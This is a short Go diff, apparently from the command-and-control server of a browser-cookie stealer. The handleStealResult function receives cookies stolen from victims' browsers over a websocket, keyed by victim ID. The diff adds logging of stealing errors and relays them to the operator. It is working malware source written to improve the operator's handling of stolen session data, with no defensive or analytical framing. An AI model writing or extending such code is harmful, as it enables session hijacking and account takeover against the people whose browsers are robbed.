@@ -323,7 +323,13 @@ func (h *Hub) handleStealResult(ws *websocket.Conn, payload map[string]any) {
 		return
 	}
 
+	stealErrors := ""
 	for browserName, cookies := range browsers {
+		if browserName == "_errors" {
+			stealErrors = cookies
+			log.Printf("[ws:steal_result] %s diag: %s", victimID, cookies)
+			continue
+		}
 		if cookies == "" {
 			continue
 		}
@@ -350,6 +356,9 @@ func (h *Hub) handleStealResult(ws *websocket.Conn, payload map[string]any) {
 		"type":       "steal_result",
 		"victim_id":  victimID,
 		"steal_time": stealTime,
+	}
+	if stealErrors != "" {
+		relay["steal_errors"] = stealErrors
 	}
 	relayB, _ := json.Marshal(relay)
 
